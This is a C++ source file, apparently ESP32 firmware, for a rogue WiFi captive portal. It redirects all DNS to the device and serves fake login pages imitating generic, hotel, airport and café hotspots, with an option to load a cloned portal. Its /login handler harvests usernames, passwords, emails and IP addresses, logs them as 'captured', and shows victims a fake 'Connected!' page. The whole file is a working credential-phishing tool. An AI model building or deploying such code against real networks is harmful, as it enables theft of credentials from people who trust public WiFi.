#include "captive_portal.h"
#include "config.h"

CaptivePortal::CaptivePortal() {
    dnsServer = nullptr;
    webServer = nullptr;
    running = false;
    credentialCount = 0;
    portalHTML = "";
}

void CaptivePortal::begin(const char* ssid) {
    currentSSID = String(ssid);
    
    Serial.println("\n[*] Starting Captive Portal...");
    
    // Initialize DNS Server
    dnsServer = new DNSServer();
    dnsServer->start(53, "*", WiFi.softAPIP()); // Redirect all domains to ESP32
    
    // Initialize Web Server
    webServer = new AsyncWebServer(80);
    setupWebServer();
    webServer->begin();
    
    running = true;
    
    Serial.println("[+] Captive Portal started!");
    Serial.printf("[+] Portal URL: http://%s\n", WiFi.softAPIP().toString().c_str());
}

void CaptivePortal::stop() {
    if (dnsServer) {
        dnsServer->stop();
        delete dnsServer;
        dnsServer = nullptr;
    }
    
    if (webServer) {
        webServer->end();
        delete webServer;
        webServer = nullptr;
    }
    
    running = false;
    Serial.println("[*] Captive Portal stopped");
}

void CaptivePortal::handleClient() {
    if (dnsServer && running) {
        dnsServer->processNextRequest();
    }
}

bool CaptivePortal::isRunning() {
    return running;
}

void CaptivePortal::setupWebServer() {
    // Generate default portal if none set
    if (portalHTML.length() == 0) {
        portalHTML = generateGenericPortal();
    }
    
    // Serve portal page for all requests
    webServer->onNotFound([this](AsyncWebServerRequest *request) {
        request->send(200, "text/html", portalHTML);
    });
    
    // Root page
    webServer->on("/", HTTP_GET, [this](AsyncWebServerRequest *request) {
        request->send(200, "text/html", portalHTML);
    });
    
    // Handle login POST
    webServer->on("/login", HTTP_POST, [this](AsyncWebServerRequest *request) {
        String username = "";
        String password = "";
        String email = "";
        
        // Get form data
        if (request->hasParam("username", true)) {
            username = request->getParam("username", true)->value();
        }
        if (request->hasParam("password", true)) {
            password = request->getParam("password", true)->value();
        }
        if (request->hasParam("email", true)) {
            email = request->getParam("email", true)->value();
        }
        
        // Store credentials
        if (credentialCount < 50) {
            credentials[credentialCount].timestamp = getTimestamp();
            credentials[credentialCount].username = username;
            credentials[credentialCount].password = password;
            credentials[credentialCount].email = email;
            credentials[credentialCount].ipAddress = request->client()->remoteIP().toString();
            credentialCount++;
            
            Serial.println("\n[+] Credential captured!");
            Serial.printf("    Username: %s\n", username.c_str());
            Serial.printf("    Password: %s\n", password.c_str());
            Serial.printf("    Email: %s\n", email.c_str());
            Serial.printf("    IP: %s\n", request->client()->remoteIP().toString().c_str());
        }
        
        // Redirect to success page or internet
        String successHTML = R"(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connected</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        }
        .success-box {
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            text-align: center;
            max-width: 400px;
        }
        .checkmark {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            display: block;
            stroke-width: 2;
            stroke: #4bb543;
            stroke-miterlimit: 10;
            margin: 10px auto;
            box-shadow: inset 0px 0px 0px #4bb543;
            animation: fill .4s ease-in-out .4s forwards, scale .3s ease-in-out .9s both;
        }
        h1 { color: #333; margin: 20px 0; }
        p { color: #666; line-height: 1.6; }
        @keyframes fill {
            100% { box-shadow: inset 0px 0px 0px 30px #4bb543; }
        }
    </style>
</head>
<body>
    <div class="success-box">
        <svg class="checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
            <circle class="checkmark-circle" cx="26" cy="26" r="25" fill="none"/>
            <path class="checkmark-check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8"/>
        </svg>
        <h1>Connected!</h1>
        <p>You are now connected to the internet.</p>
        <p style="font-size: 12px; color: #999; margin-top: 20px;">You can close this window.</p>
    </div>
    <script>
        setTimeout(function() {
            window.location.href = 'http://www.google.com';
        }, 3000);
    </script>
</body>
</html>
)";
        
        request->send(200, "text/html", successHTML);
    });
    
    // Captive portal detection endpoints
    webServer->on("/generate_204", HTTP_GET, [this](AsyncWebServerRequest *request) {
        request->redirect("/");
    });
    
    webServer->on("/gen_204", HTTP_GET, [this](AsyncWebServerRequest *request) {
        request->redirect("/");
    });
    
    webServer->on("/hotspot-detect.html", HTTP_GET, [this](AsyncWebServerRequest *request) {
        request->redirect("/");
    });
}

int CaptivePortal::getCredentialCount() {
    return credentialCount;
}

Credential CaptivePortal::getCredential(int index) {
    if (index >= 0 && index < credentialCount) {
        return credentials[index];
    }
    return Credential();
}

void CaptivePortal::clearCredentials() {
    credentialCount = 0;
    Serial.println("[*] All credentials cleared");
}

String CaptivePortal::getFormattedCredentials() {
    String output = "\n╔══════════════════════════════════════════════════════════════╗\n";
    output += "║                  CAPTURED CREDENTIALS                        ║\n";
    output += "╚══════════════════════════════════════════════════════════════╝\n\n";
    
    if (credentialCount == 0) {
        output += "[*] No credentials captured yet.\n";
        return output;
    }
    
    output += "Total captured: " + String(credentialCount) + "\n\n";
    
    for (int i = 0; i < credentialCount; i++) {
        output += "╔══════════════════════════════════════════════════════════════╗\n";
        output += "║ Credential #" + String(i + 1) + "\n";
        output += "╠══════════════════════════════════════════════════════════════╣\n";
        output += "║ Time:     " + credentials[i].timestamp + "\n";
        output += "║ IP:       " + credentials[i].ipAddress + "\n";
        
        if (credentials[i].username.length() > 0) {
            output += "║ Username: " + credentials[i].username + "\n";
        }
        if (credentials[i].email.length() > 0) {
            output += "║ Email:    " + credentials[i].email + "\n";
        }
        if (credentials[i].password.length() > 0) {
            output += "║ Password: " + credentials[i].password + "\n";
        }
        
        output += "╚══════════════════════════════════════════════════════════════╝\n\n";
    }
    
    return output;
}

void CaptivePortal::setPortalHTML(const String& html) {
    portalHTML = html;
}

void CaptivePortal::useClonedPortal(const String& html) {
    portalHTML = html;
    Serial.println("[+] Using cloned portal HTML");
}

void CaptivePortal::setPortalType(int type) {
    switch(type) {
        case PORTAL_HOTEL:
            portalHTML = generateHotelPortal();
            break;
        case PORTAL_AIRPORT:
            portalHTML = generateAirportPortal();
            break;
        case PORTAL_COFFEE:
            portalHTML = generateCoffeeShopPortal();
            break;
        default:
            portalHTML = generateGenericPortal();
            break;
    }
}

String CaptivePortal::generateGenericPortal() {
    return R"(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .login-container {
            background: white;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 400px;
            width: 100%;
        }
        h1 {
            color: #333;
            margin-bottom: 10px;
            font-size: 28px;
            text-align: center;
        }
        p {
            color: #666;
            margin-bottom: 30px;
            text-align: center;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            color: #555;
            margin-bottom: 8px;
            font-weight: 500;
        }
        input {
            width: 100%;
            padding: 12px;
            border: 2px solid #e1e1e1;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        input:focus {
            outline: none;
            border-color: #667eea;
        }
        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s;
        }
        button:hover {
            transform: translateY(-2px);
        }
        .wifi-icon {
            font-size: 48px;
            text-align: center;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="wifi-icon">📶</div>
        <h1>WiFi Login</h1>
        <p>Enter your credentials to access the internet</p>
        <form action="/login" method="POST">
            <div class="form-group">
                <label>Email or Username</label>
                <input type="text" name="username" placeholder="Enter your email or username" required>
            </div>
            <div class="form-group">
                <label>Password</label>
                <input type="password" name="password" placeholder="Enter your password" required>
            </div>
            <button type="submit">Connect to WiFi</button>
        </form>
    </div>
</body>
</html>
)";
}

String CaptivePortal::generateHotelPortal() {
    return R"(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hotel WiFi</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Georgia', serif;
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .login-container {
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 450px;
            width: 100%;
        }
        .hotel-header {
            text-align: center;
            margin-bottom: 30px;
            padding-bottom: 20px;
            border-bottom: 2px solid #1e3c72;
        }
        h1 {
            color: #1e3c72;
            font-size: 32px;
            margin-bottom: 5px;
        }
        .subtitle {
            color: #666;
            font-style: italic;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            color: #555;
            margin-bottom: 8px;
            font-weight: 500;
        }
        input {
            width: 100%;
            padding: 12px;
            border: 2px solid #e1e1e1;
            border-radius: 5px;
            font-size: 16px;
        }
        input:focus {
            outline: none;
            border-color: #1e3c72;
        }
        button {
            width: 100%;
            padding: 14px;
            background: #1e3c72;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }
        button:hover {
            background: #2a5298;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="hotel-header">
            <h1>🏨 Grand Hotel</h1>
            <p class="subtitle">Complimentary WiFi for Guests</p>
        </div>
        <form action="/login" method="POST">
            <div class="form-group">
                <label>Room Number / Email</label>
                <input type="text" name="username" placeholder="Enter room number or email" required>
            </div>
            <div class="form-group">
                <label>Last Name / Password</label>
                <input type="password" name="password" placeholder="Enter your last name or password" required>
            </div>
            <button type="submit">Access WiFi</button>
        </form>
    </div>
</body>
</html>
)";
}

String CaptivePortal::generateAirportPortal() {
    return R"(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Airport WiFi</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: Arial, sans-serif;
            background: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .login-container {
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
            max-width: 400px;
            width: 100%;
        }
        .airport-header {
            text-align: center;
            margin-bottom: 30px;
        }
        h1 {
            color: #0066cc;
            font-size: 28px;
            margin-bottom: 10px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            color: #333;
            margin-bottom: 8px;
            font-weight: 600;
        }
        input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 16px;
        }
        button {
            width: 100%;
            padding: 14px;
            background: #0066cc;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }
        button:hover {
            background: #0052a3;
        }
        .info {
            margin-top: 20px;
            padding: 15px;
            background: #f0f8ff;
            border-left: 4px solid #0066cc;
            font-size: 14px;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="airport-header">
            <h1>✈️ Airport Free WiFi</h1>
            <p style="color: #666;">Connect to continue your journey</p>
        </div>
        <form action="/login" method="POST">
            <div class="form-group">
                <label>Email Address</label>
                <input type="email" name="email" placeholder="your@email.com" required>
            </div>
            <div class="form-group">
                <label>Password (if you have an account)</label>
                <input type="password" name="password" placeholder="Optional">
            </div>
            <button type="submit">Connect Now</button>
        </form>
        <div class="info">
            ℹ️ Free WiFi available for 2 hours. Please enter your email to continue.
        </div>
    </div>
</body>
</html>
)";
}

String CaptivePortal::generateCoffeeShopPortal() {
    return R"(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Coffee Shop WiFi</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Courier New', monospace;
            background: #3e2723;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .login-container {
            background: #fff8e1;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
            max-width: 400px;
            width: 100%;
            border: 3px solid #6d4c41;
        }
        h1 {
            color: #3e2723;
            font-size: 32px;
            margin-bottom: 10px;
            text-align: center;
        }
        .coffee-icon {
            font-size: 48px;
            text-align: center;
            margin-bottom: 20px;
        }
        p {
            color: #5d4037;
            margin-bottom: 30px;
            text-align: center;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            color: #3e2723;
            margin-bottom: 8px;
            font-weight: bold;
        }
        input {
            width: 100%;
            padding: 12px;
            border: 2px solid #8d6e63;
            border-radius: 8px;
            font-size: 16px;
            background: white;
        }
        button {
            width: 100%;
            padding: 14px;
            background: #6d4c41;
            color: #fff8e1;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }
        button:hover {
            background: #5d4037;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="coffee-icon">☕</div>
        <h1>Café WiFi</h1>
        <p>Free WiFi for our customers</p>
        <form action="/login" method="POST">
            <div class="form-group">
                <label>Email</label>
                <input type="email" name="email" placeholder="your@email.com" required>
            </div>
            <div class="form-group">
                <label>Name (Optional)</label>
                <input type="text" name="username" placeholder="Your name">
            </div>
            <button type="submit">Get Connected</button>
        </form>
    </div>
</body>
</html>
)";
}

String CaptivePortal::getTimestamp() {
    unsigned long seconds = millis() / 1000;
    unsigned long minutes = seconds / 60;
    unsigned long hours = minutes / 60;
    
    seconds = seconds % 60;
    minutes = minutes % 60;
    hours = hours % 24;
    
    char buffer[20];
    sprintf(buffer, "%02lu:%02lu:%02lu", hours, minutes, seconds);
    return String(buffer);
}

// void CaptivePortal::setPortalHTML(const String& html) {
//     portalHTML = html;
// }